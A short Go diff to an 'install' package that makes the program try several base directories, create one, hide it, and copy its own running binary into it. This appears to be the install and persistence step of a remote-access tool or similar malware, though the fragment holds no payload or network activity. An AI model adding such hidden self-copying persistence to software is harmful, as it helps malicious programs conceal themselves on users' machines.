@@ -1,6 +1,7 @@
 package install
 
 import (
+	"errors"
 	"os"
 	"path"
 	"syscall"
@@ -21,16 +22,19 @@ func HideFile(fn string) error {
 
 //CreateBase establishes an free directory as specified in Constants.
 func CreateBase() (string, error) {
-	base := os.ExpandEnv(util.Base)
-	if err := os.Mkdir(base, os.ModeDir); err != nil {
-		return base, err
+	for _, base := range util.Base {
+		base = os.ExpandEnv(base)
+		if err := os.Mkdir(base, os.ModeDir); err == nil || os.IsExist(err) {
+			return base, HideFile(base)
+		}
 	}
-	return base, HideFile(base)
+
+	return "", errors.New("Generic failure")
 }
 
 //CopyExecutable copies the current binary to the Base.
 func CopyExecutable() error {
-	bin := path.Join(os.ExpandEnv(util.Base), util.Binary)
+	bin := path.Join(Info.Base, util.Binary)
 	err := util.CopyFile(os.Args[0], bin)
 	if err != nil {
 		return err
